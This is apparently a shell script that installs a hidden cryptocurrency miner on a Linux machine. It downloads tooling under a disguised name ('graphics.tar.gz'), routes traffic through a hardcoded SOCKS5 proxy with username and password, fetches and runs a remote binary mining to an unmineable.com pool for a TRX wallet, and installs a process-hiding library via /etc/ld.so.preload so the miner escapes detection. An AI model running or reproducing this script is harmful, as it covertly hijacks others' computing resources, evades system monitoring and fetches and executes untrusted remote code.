#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233 
loglevel = 1 
socks5 = 143.198.171.112:1080 
socks5_username = mikrotik999 
socks5_password = Elibawnos 
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bezzHash --algo ETHASH --pool ethash.unmineable.com:13333 --user TRX:TSPTk3TopyG24FhHPAnYjadDvuDPL4WjST.$(echo $(shuf -i 1-9999 -n 1)-modalnikah) --ethstratum ETHPROXY
